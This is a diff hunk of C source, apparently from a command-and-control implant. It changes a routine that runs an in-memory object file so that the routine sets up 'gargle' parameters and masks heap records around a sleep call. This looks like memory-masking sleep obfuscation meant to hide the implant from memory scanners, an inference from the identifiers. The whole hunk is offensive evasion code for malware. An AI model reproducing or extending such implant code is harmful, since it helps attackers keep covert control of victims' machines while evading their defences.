@@ -563,12 +563,18 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 			memset(code.buffer, 0, code.length);
 		inlinefunc = (void(*)(char * buffer, int length))(code_dst + entry);
 		if (finalize_memory_permissions(base, total)) {
-			if (conv == 1 && gparms != NULL) {
+			if (conv == 1) {
 				DWORD t = 0;
 				if (args != NULL && alen >= (int)sizeof(DWORD))
 					memcpy(&t, args, sizeof(DWORD));
-				gparms->heap_records = track_memory_get_heap_records_to_mask();
-				((void (*)(GARGLEP *, void *, DWORD))inlinefunc)(gparms, (void *)Sleep, t);
+				gargle_setup_parms(code_dst, code_dst + code.length);
+				if (gparms == NULL) {
+					Sleep(t);
+				}
+				else {
+					gparms->heap_records = track_memory_get_heap_records_to_mask();
+					((void (*)(GARGLEP *, void *, DWORD))inlinefunc)(gparms, (void *)Sleep, t);
+				}
 			}
 			else {
 				inlinefunc(args, alen);
